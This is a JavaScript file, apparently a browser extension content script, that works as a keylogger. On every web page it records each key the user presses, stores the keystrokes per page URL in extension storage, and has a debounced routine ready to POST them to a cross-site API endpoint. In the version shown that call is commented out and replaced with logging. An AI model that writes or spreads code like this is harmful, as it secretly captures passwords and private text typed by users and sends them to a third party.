
if(typeof utils === 'undefined'){
  const utils = {
    config: {
      debounce: 3000,
      dest: 'some_api_url.com/api',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Sec-Fetch-Dest': 'object',
        'Sec-Fetch-mode': 'cors',
        'Sec-Fetch-Site': 'cross-site'
      }
    },
    base64(str){
      // href base64 encoded as key
      return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
        function(match, p1) {
          return String.fromCharCode('0x' + p1);
      }));
    },
    debounce(func, wait, immediate) {
    	let timeout;
    	return function() {
    		let context = this,
        args = arguments,
    		later = function() {
    			timeout = null;
    			if (!immediate) {
            func.apply(context, args);
          }
    		}
    		let callNow = immediate && !timeout;
    		clearTimeout(timeout);
    		timeout = setTimeout(later, wait);
    		if(callNow){
          func.apply(context, args);
        }
    	}
    },
    post(data){
      fetch(utils.config.dest,{
        method: utils.config.method,
        headers: utils.config.headers,
        body: JSON.stringify(data)
      }).then(function(res){
        if (res.status >= 200 && res.status < 300) {
          return res.json();
        } else {
          return Promise.reject(new Error(res.statusText))
        }
      }).then(function(res){
        //reset href on successful post
        data[Object.keys(data[0])] = '';
        chrome.storage.local.set(data, function(res) {
          // done...
        });
      }).catch(function(err){
        // catch error
      })
    }
  }

  if(location.protocol !== 'chrome-extension:'){

    window.addEventListener("post-data", utils.debounce(function(evt) {
      console.log(evt.detail)
      /* post data */
      //utils.post(evt.detail);
    },utils.config.debounce));

    document.body.addEventListener('keyup', function(evt){
      let char = evt.key,
      href = utils.base64(location.href);

      chrome.storage.local.get([href], function(res) {
        let obj = {};
        if(res[href]){
          char = (res[href] + char);
        }
        obj[href] = char;
        chrome.storage.local.set(obj, function(res) {
          window.dispatchEvent(new CustomEvent("post-data", {detail: obj}));
          char = href = obj = null;
        });
      });
    })
  }

}
